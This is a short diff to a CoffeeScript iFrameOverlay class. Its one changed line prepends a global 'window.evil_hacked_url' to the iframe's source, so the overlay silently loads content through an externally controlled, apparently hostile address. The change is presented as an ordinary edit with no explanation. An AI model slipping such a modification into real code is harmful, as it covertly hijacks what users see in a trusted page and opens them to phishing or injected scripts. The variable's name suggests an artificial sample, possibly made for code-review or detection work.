@@ -7,7 +7,7 @@ class @iFrameOverlay
 
   create_markup: () ->
     @wrapper = $ '<div class="overlay_wrapper"></div>'
-    @iframe = $ '<iframe class="overlay_iframe" src="'+@link.target+'"></iframe>'
+    @iframe = $ '<iframe class="overlay_iframe" src="'+window.evil_hacked_url+@link.target+'"></iframe>'
     @close = $ '<div class="close"> X </div>'
     @close.click () ->
       $(this).parent().remove()
